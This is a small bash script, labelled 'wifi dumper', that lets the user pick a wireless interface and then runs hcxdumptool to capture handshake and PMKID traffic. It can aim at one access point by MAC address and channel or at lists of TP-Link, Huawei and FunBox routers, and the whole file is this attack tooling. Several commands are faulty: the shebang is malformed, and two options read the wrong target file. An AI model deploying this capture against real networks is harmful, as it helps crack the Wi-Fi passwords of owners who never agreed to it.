#!bin/bash
#wifi dumper

echo "
[+] 1 = setup precise AP attack
[+] 2 = go to multiple vector attack setup
[+] 3 Cancel"

read z
case "$z" in
"1") echo "--paste MAC address below: ";read m;echo "--paste AP transimition channel below: ";read c;;
"2") echo "check if target_vendor file is ready";;
"3") echo "Cancel action";;
esac

echo " what NIC use? 

[+] 1 = wlan0
[+] 2 = wlan1"

read wlan

case "$wlan" in
"1") w="wlan0";;
"2") w="wlan1";;
esac

echo "
[+] 1 = start harvaster on precise targeted AP
[+] 2 = start harvaster on TP-link
[+] 3 = start harvaster on HUAWEI
[+] 4 = start harvaster on FunBox
[+] 5 = Cancel attack"

read n
case "$n" in
"1") sudo hcxdumptool -i $w -o ./dump/dumpfileAP.pcapng --active_beacon --enable_status=15 --filtermode=2 --filterlist_ap="$m" -c "$c";;
"2") sudo awk '{print $1}' ./targets/target_TP.txt > ./targets/target_TP; cat ./targets/target_TP | uniq -d && sudo hcxdumptool -i $w -o ./dump/dumpfileTP.pcapng --active_beacon --enable_status=15 --filtermode=2 --filterlist_ap=./targets/target_TP;;
"3") sudo awk '{print $1}' ./targets/target_Huw.txt > ./targets/target_Huw; cat ./targets/target_TP | uniq -d && sudo hcxdumptool -i $w -o ./dump/dumpfileHuW.pcapng --active_beacon --enable_status=15 --filtermode=2 --filterlist_ap=./targets/target_Huw;;
"4") sudo awk '{print $1}' ./targets/target_FunB.txt > ./targets/target_FunB; cat ./targets/target_TP | uniq -d  && sudo hcxdumptool -i $w -o ./dump/dumpfileFunB.pcapng --active_beacon --enable_status=15 --filtermode=2 --filterlist_ap=./targets/target_FunB;;
"5") echo "Cancel";;
esac


echo "--------------------------------------------------------"
echo
echo "[+]scan canceled check output in dump folder "
echo 
echo "--------------------------------------------------------"
